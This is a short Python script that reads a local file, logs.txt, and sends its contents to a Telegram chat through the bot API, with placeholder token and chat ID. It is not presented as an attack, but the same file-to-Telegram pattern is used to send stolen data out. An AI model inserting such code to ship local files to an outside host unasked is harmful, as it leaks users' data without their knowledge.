#!/usr/bin/python3

import requests
import os


with open('logs.txt') as f:
    logs = f.read()

def send_msg(text):

    token = "<ID_bot>"
    chat_id = "<ID_chat>"
    url_req = "https://api.telegram.org/bot"+ token +"/sendMessage" + "?chat_id=" + chat_id + "&text=" + text

    chat = requests.get(url_req)
    print(chat.json())

send_msg(logs)
